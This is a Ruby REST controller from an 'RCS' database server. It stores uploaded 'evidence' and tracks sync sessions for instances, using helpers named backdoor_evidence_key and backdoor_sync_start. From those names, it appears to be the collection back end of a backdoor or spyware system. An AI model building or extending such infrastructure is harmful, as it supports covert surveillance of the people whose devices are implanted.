#
# Controller for the Evidence objects
#

require 'rcs-db/db_layer'

# rcs-common
require 'rcs-common/evidence_manager'
require 'rcs-common/symbolize'

require 'eventmachine'
require 'em-http-request'

# system
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  def index
    require_auth_level :viewer
    trace :debug, "INDEX #{params}"
  end

  def show
    require_auth_level :viewer
    trace :debug, "SHOW #{params}"
  end

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server

    # create a phony session
    session = {:instance => params[:evidence]}

    # save the evidence in the db
    begin
      id = EvidenceManager.store_evidence session, @req_content.size, @req_content
      # notify the worker
      trace :info, "Evidence saved. Notifying worker of [#{session[:instance]}][#{id}]"
      notification = {session[:instance] => [id]}.to_json
      request = EM::HttpRequest.new('http://127.0.0.1:5150').post :body => notification
      request.callback {|http| http.response}
    rescue
      return STATUS_NOT_FOUND
    end
    
    return STATUS_OK, *json_reply({:bytes => @req_content.size})
  end
  
  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server

    # create a phony session
    session = params.symbolize

    # retrieve the key from the db
    key = DB.backdoor_evidence_key(session[:bid])
    
    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(params['sync_time']).getutc
    
    # store the status
    EvidenceManager.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key

    # update db with sync status
    DB.backdoor_sync_start session[:bid], time, params['user'], params['device'], params['source']
    
    return STATUS_OK
  end

  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server

    # create a phony session
    session = params.symbolize

    # store the status
    EvidenceManager.sync_end session

    return STATUS_OK
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = params.symbolize

    # store the status
    EvidenceManager.sync_timeout session

    return STATUS_OK
  end

end

end #DB::
end #RCS::